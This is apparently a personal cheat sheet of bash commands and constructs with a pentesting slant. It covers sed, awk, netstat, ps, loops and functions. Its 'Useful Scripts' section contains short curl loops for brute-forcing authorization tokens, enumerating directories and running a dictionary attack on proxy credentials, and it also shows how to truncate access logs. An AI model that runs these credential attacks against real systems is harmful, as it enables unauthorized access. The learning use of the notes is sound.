---
title: Bash Scripts
sidebar_label: Bash Scripts
---

* [Bash](#bash)
  * [Sed](#sed)  
  * [awk](#awk)
* [Useful Scripts](#useful-scripts)
  * [Authorization Token](#authorization-token)
  * [Directory Listing](#directory-listing)
  * [proxy authentication dictionary attk](#proxy-authentication-dictionary-attk)
* [System Commands](#system-commands)
  * [`find`](#find)
  * [`locate`](#locate)
  * [`netstat`](#netstat)
  * [`ps`](#ps)
  * [`grep`](#grep)
  * [empty file](#empty-file)
* [Basic Bash Commands and Constructs](#basic-bash-commands-and-constructs)
  * [Basic Expressions](#basic-expressions)
  * [If-else](#if-else)
  * [Menu select](#menu-select)
  * [`test` Expressions](#test-expressions)
  * [for loops](#for-loops)
  * [for-in-loops](#for-in-loops)
  * [Functions](#functions)
    * [Arguments](#arguments)
    * [Local Variables](#local-variables)
    * [Exit codes](#exit-codes)
  * [Read file line by line](#read-file-line-by-line)

# Bash
## Sed
```bash
# Format
# sed 's/regexp/replace/g' filename.txt
sed 's/,/ /g' filename.txt # replaces all comma with space
sed 's/\//g' filename.txt # remove / from filename.txt
```
## awk
```sh
awk -F: '{print $1} creds # prints first coulumn of file creds which contains : separated values
awk -F, '{print $1} creds # prints first coulumn of file creds which contains , separated values
```
# Useful Scripts
## Authorization Token
Bash script to read different tokens from a file and pass them to `curl` command to find out the valid token for authorization. To read file line by line in a `while` loop you can refer [Read file line by line](#read-file-line-by-line)
```bash
#!/bin/bash
while read token; do
content=$(curl -s -H 'Authorization: Token '"$token" $1)
if echo "$content" | grep -qi "unauth"; then
continue
else
echo "Found token : $token"
fi
done <$2
```
output
```sh
./brute.sh 192.186.248.3 wordlists/100-common-passwords.txt
```
## Directory Listing
```bash
#!/bin/bash
while read dir_name; do
echo "Trying directory: $dir_name"
curl http://$1$dir_name
done <$2
```
output
```sh
./testscript.sh 192.11.183.3 directory.txt
```
## proxy authentication dictionary attk
```bash
#!/bin/bash
  
while read user
do
  while read passwd
  do
    content=$(curl -I -x "$user":"$passwd"@$1 $2)
    echo "$user - $passwd"
    if echo "$content" | grep -qi "407 proxy authentication required"; then
      continue
    else
      echo "Found usernam-pwd : $user - $passwd"
      exit 0
    fi
  done <$4
done <$3
```
```sh
$ ./crack.py 192.144.18.3:3128 127.0.0.1  usernames.lst password.lst
```
# System Commands
## `find`
```bash
find / -type f -name '*.txt'
find / -type f -perm 775 -user student
```
## `locate`
```sh
# -i option to perform a case-insensitive search
locate wordlist
```
## `netstat`
Refs:
* <https://www.binarytides.com/linux-netstat-command-examples/>

`netstat` is a command line utility that can be used to list out all the network (socket) connections on a system.
```sh
# Enumerate services running on the target machine
ps -ef
netstat -anlp

# List out all connections
netstat -a

# List out only tcp connections
netstat -at

# Disable reverse dns lookup for faster output. By default, the netstat command tries to find out the hostname of each ip address in the # connection by doing a reverse dns lookup. This slows down the output.
netstat -n

# List out only listening connections
netstat -l

# Get process name/pid and user id. -p for process name/pid and -e for user
# When using the -p option, netstat must be run with root privileges, otherwise it cannot detect the pids of processes running with root # privileges and most services like http and ftp often run with root privileges.
sudo netstat -ltpe

# All established connections from the server.
netstat -natu | grep 'ESTABLISHED'
netstat -natu | grep 'ESTABLISHED' | grep 61.177.142.158

# Listening Connection
netstat -an | grep 'LISTEN'
netstat -tnl
```
## `ps`
```sh
# Display all processes in BSD format
ps aux
```
`-a` flag stands for all processes

`-x` will display all processes even those not associated with the current tty
```sh
# To view a full format listing run
ps -ef
```
## `grep`
```sh
grep -nr "db_user"
```
`-n` is to print line number and `-r` searches in the directory recursively
## empty file
```
# -n tells echo not to output the trailing newline
echo -n "" > access.log

# The truncate command helps to shrink or extend the size of a file to a defined size.
# -s option specifies the file size
truncate -s 0 access.log
```
# Basic Bash Commands and Constructs
Refs :
* <https://www.youtube.com/watch?v=LTuuMtQR1uQ&list=PLBf0hzazHTGMJzHon4YXGscxUvsFpxrZT>
* <https://www.youtube.com/watch?v=aNQCl_ByM20>
## Basic Expressions
```bash
#!/bin/bash

# No space is allowed before and after the assignment (i.e. the equal sign) in BASH
counter=8

echo "Double vs Single quote"
echo "$counter"
# single quote prevents shell expansion to keep text as it is
echo '$counter' 

echo "Variable Expansion"
echo $counter
echo ${counter}th floor

echo "Brace Expansion"
echo T{a,i,o}m

echo "Arithematic Expansion"
echo $[3*2]
echo $((3*2))
echo $((counter++))
echo $((counter--))

echo "Parameter Expansion"
opt=${1:-DEFAULT VALUE}
echo $opt
```
output
```sh
Double vs Single quote
8
$counter
Variable Expansion
8
8th floor
Brace Expansion
Tam Tim Tom
Arithematic Expansion
6
6
8
9
Parameter Expansion
DEFAULT VALUE
```
## If-else
```bash
#!/bin/bash
echo "Enter your username : "; read NAME

# format 1
# if test-result-is-true; then COMMAND; fi
if [ "$NAME" = "Eliot" ]; then echo "Welcome back Eliot"; else echo "Please register"; fi

function test_func() {
  return 0
}

# format 2
# if function-return-zero; then COMMAND; fi
if test_func
then
  echo "Function returned zero"
else
  echo "Non zero return!!!"
fi
```
output
```sh
Enter your username : 
Eliot
Welcome back Eliot
Function returned zero
```

## Menu select
```bash
#!/bin/bash
menu="Pizza Burger FrenchFries Quit"
select choice in $menu; do
  [[ $choice == Quit ]] && {
    echo bye
    break
  }
  # REPLY is a BASH built-in variable for select construct
  echo "You selected option $REPLY"
done
```
output
```sh
1) Pizza
2) Burger
3) FrenchFries
4) Quit
#? 3
You selected option 3
#? 4
bye
```
## `test` Expressions
We can make use of conditional expressions in the bash scripting. In order to know the available expressions use
```sh
$ help test
test: test [expr]
    Evaluate conditional expression.
    
    Exits with a status of 0 (true) or 1 (false) depending on
    the evaluation of EXPR.
    
    -d FILE        True if file is a directory.
    -e FILE        True if file exists.
```
### Use of `test` expression in if-else
```bash
#!/bin/bash
if [ -e /etc/shadow ]; then echo "File exists"; else echo "Missing..."; fi
```
## for loops
```bash
#!/bin/bash
for((i = 1, j = 10; i <= 3 && j <= 20; i++, j += 10)); do echo $i $j; done
```
output
```
1 10
2 20
```
## for-in-loops
```bash
#!/bin/bash
for NAME in $(cat names.txt); do
  echo "Name is : $NAME"
done
```
output
```sh 
Name is : ram
Name is : shayam
Name is : sita
```
```bash
#!/bin/bash
echo "Please enter the subnet : "
read SUBNET
for IP in $(seq 1 254); do
  ping -c 1 $SUBNET.$IP
done
```
output
```sh
Please enter the subnet : 
192.234.246
PING 192.234.246.1 (192.234.246.1) 56(84) bytes of data.
64 bytes from 192.234.246.1: icmp_seq=1 ttl=64 time=0.079 ms
```
## Functions
### Arguments
```bash
#!/bin/bash
function show_arguments() { #define a function
  echo $@    # all arguments
  echo $*    # all arguments
  echo $1 $2 # first and second arguments
}
show_arguments 1 "a b c" 3
```
output
```sh
1 a b c 3
1 a b c 3
1 a b c
```
### Local Variables
```bash
#!/bin/bash
counter=4
function check() { #define a function
  local counter=8
  echo $counter  
}
check
echo $counter
```
output
```sh
8
4
```
### Exit codes
```bash
#!/bin/bash
function func() { #define a function
  return $1  
}
func 5
(($? != 0)) && { echo "Error M1"; } # Method 1
if ! func 5; then echo "Error M2"; fi # Method 2
```
output
```sh
Error M1
Error M2
```
## Read file line by line
Refs:
* <https://www.cyberciti.biz/faq/unix-howto-read-line-by-line-from-file/>

`while read -r line; do COMMAND; done < input.file`

The `-r` option passed to read command prevents backslash escapes from being interpreted.
Add `IFS=` option before read command to prevent leading/trailing whitespace from being trimmed.

`while IFS= read -r line; do COMMAND $line; done < input.file`
```bash
#!/bin/bash
input="/path/to/txt/file"
while IFS= read -r line
do
  echo "$line"
done < "$input"
```


